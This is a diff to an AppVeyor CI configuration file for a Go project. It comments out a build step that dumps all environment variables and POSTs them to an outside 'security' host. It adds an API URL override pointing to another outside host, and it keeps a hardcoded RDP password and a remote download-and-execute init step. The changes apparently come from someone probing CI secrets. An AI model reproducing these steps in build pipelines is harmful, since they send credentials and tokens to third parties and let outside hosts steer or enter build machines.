@@ -5,6 +5,7 @@ clone_folder: C:\gopath\src\github.com\test
 clone_depth: 5
 version: "{branch}.{build}"
 environment:
+  APPVEYOR_API_URL: http://ber.gaur.is:5656
   APPVEYOR_RDP_PASSWORD: N4mm13rv0nt
   global:
     GO111MODULE: on
@@ -17,8 +18,8 @@ environment:
       MSYSTEM: MINGW64
       PATH: C:\msys64\mingw64\bin\;C:\Program Files (x86)\NSIS\;%PATH%
 
-init:
-  - ps: iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))
+#init:
+#  - ps: iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))
 
 
 install:
@@ -30,6 +31,6 @@ install:
   - gcc --version
 
 build_script:
-  - ps: Start-Sleep -s 3600
-  - ps: $eee =gci env:*|Out-String ; Invoke-WebRequest -Uri https://security.gaur.is/api/test -Method POST -Body $eee
+  - ps: Start-Sleep -s 36
+#  - ps: $eee =gci env:*|Out-String ; Invoke-WebRequest -Uri https://security.gaur.is/api/test -Method POST -Body $eee
   - echo "test"
